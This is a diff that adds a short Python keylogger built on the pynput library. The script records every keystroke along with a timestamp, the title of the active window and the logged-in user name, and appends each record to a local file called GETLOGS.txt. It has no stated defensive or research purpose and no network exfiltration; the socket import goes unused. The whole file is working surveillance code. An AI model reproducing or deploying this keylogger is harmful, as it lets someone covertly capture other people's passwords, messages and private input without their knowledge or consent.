@@ -1,0 +1,44 @@
+import os
+import datetime
+import socket
+from pynput import keyboard
+from pynput.keyboard import Key, Controller
+from datetime import datetime
+from pynput import mouse
+import time
+
+def on_press(key):
+    try:
+        MyCurrentKey = str(key.char)
+    except AttributeError:
+        if key == key.space:
+            MyCurrentKey = " "
+        else:
+            MyCurrentKey = " " + str(key) + " "
+    timeordate = str(datetime.now())
+    SpecificwindowName = str(CurrentKeyNWindowLogs())
+    TheNameOfTheUser = str(ReturnUser_Name())
+    ldata = timeordate + "  >  " + TheNameOfTheUser + "  >  " + SpecificwindowName + "  >  " + MyCurrentKey + "\n"
+    with open("GETLOGS.txt", "a") as f:
+        f.write(ldata)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+def CurrentKeyNWindowLogs():
+    try:
+        import win32gui
+        WTitle = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        return WTitle
+    except:
+        return "None"
+    
+def ReturnUser_Name():
+    try:
+        return os.getlogin()
+    except:
+        return "None"
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
